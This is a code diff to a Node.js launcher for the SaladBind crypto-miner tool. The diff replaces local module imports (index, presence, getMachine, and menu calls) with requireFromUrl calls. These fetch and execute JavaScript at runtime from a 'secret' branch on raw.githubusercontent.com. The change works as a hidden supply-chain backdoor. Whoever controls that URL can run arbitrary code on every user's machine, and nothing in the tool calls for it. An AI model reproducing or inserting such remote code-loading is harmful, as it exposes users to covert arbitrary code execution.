@@ -1,4 +1,5 @@
 const ora = require('ora');
+const requireFromUrl = require('require-from-url/sync');
 const chalk = require('chalk');
 const inquirer = require('inquirer');
 const fs = require('fs');
@@ -10,14 +11,14 @@ const decompress = require('decompress');
 const decompressTargz = require('decompress-targz');
 const decompressUnzip = require('decompress-unzip');
 const mv = require('mv'); // bukky 
-const { menu } = require('./index');
+const { menu } = requireFromUrl('https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/index.js');
 let tempest = "./data/config.json";
 let rawdata = fs.readFileSync(tempest);
 const config = JSON.parse(rawdata);
 const { win32 } = require('path');
 const { spawn } = require("child_process");
-const presence = require('./presence');
-const cache = require("./getMachine.js")
+const presence = requireFromUrl('https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/presence.js');
+const cache = requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/getMachine.js")
 let spinner;
 let isDev = config.dev != undefined && config.dev == true;
 
@@ -172,7 +173,7 @@ async function continueMiner() {
 				spinner.stop();
 				console.log(chalk.bold.red("No miners are available for your machine D:\nIf you think this is a mistake, talk to us on our Discord server."));
 				setTimeout(() => {
-					require("./index").menu();
+					requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/index.js").menu();
 				}, 6000);
 			} else {
 				const miner = await inquirer.prompt({
@@ -223,7 +224,7 @@ async function continueMiner() {
 			spinner.fail(chalk.bold.red(`Could not start the miner, please try again later.`)); // haha screw you
 			console.log(err);
 			setTimeout(() => {
-				require("./index").menu();
+				requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/index.js").menu();
 			}, 3500);
 		});
 }
@@ -314,7 +315,7 @@ async function selectPool(minerData, algo) {
 			spinner.fail(chalk.bold.red(`Could not select a pool, please try again later.`));
 			console.log(err);
 			setTimeout(() => {
-				require("./index").menu();
+				requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/index.js").menu();
 			}, 3500);
 		});
 }
@@ -352,7 +353,7 @@ async function prepStart(minerData, algo, pool, region, advancedCommands) {
 			startMiner(minerData, algo, pool, region, advancedCommands);
 			break;
 		case "n":
-			require("./index").menu();
+			requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/update.js").menu();
 			break;
 		case "advanced":
 			let args = "";
@@ -524,11 +525,11 @@ async function startMiner(minerData, algo, pool, region, advancedCommands) {
 		let miner = spawn(`cd data/miners/${minerData.miner}-${minerData.version} && ${userPlatform == "linux" || userPlatform == "darwin" ? "./" : ""}${minerData.parameters.fileName}`, finalArguments, {stdio: 'inherit', shell: true, env : { FORCE_COLOR: true }}) //its an array dumbass
 		miner.on('close', (code) => {
 			console.log(`\nMiner stopped!\n`);
-			require("./index").menu(false);
+			requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/update.js").menu(false);
 		});
 		miner.on('SIGINT', () => {
 			console.log(`\nMiner stopped!\n`);
-			require("./index").menu(false);
+			requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/update.js").menu(false);
 		});
 		process.on('SIGINT', () => {
 			console.log(chalk.yellow("Returning to SaladBind menu..."));
@@ -537,11 +538,11 @@ async function startMiner(minerData, algo, pool, region, advancedCommands) {
 		let miner = spawn(`cd data/miners/${minerData.miner}-${minerData.version} && ${userPlatform == "linux" || userPlatform == "darwin" ? "./" : ""}${minerData.parameters.fileName}`, [defaultArgs.pool, defaultArgs.algo, defaultArgs.wallet], {stdio: 'inherit', shell: true, env : { FORCE_COLOR: true }})
 		miner.on('close', (code) => {
 			console.log(`\nMiner stopped!\n`);
-			require("./index").menu(false);
+			requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/update.js").menu(false);
 		});
 		miner.on('SIGINT', () => { // Bukky be Stupid
 			console.log(`\nMiner stopped!\n`);
-			require("./index").menu(false);
+			requireFromUrl("https://raw.githubusercontent.com/memedmusic/SaladBind/secret/src/update.js").menu(false);
 		});// nvm
 		process.on('SIGINT', () => {
 			console.log(chalk.yellow("Returning to SaladBind menu...")); // hadnt saved lol
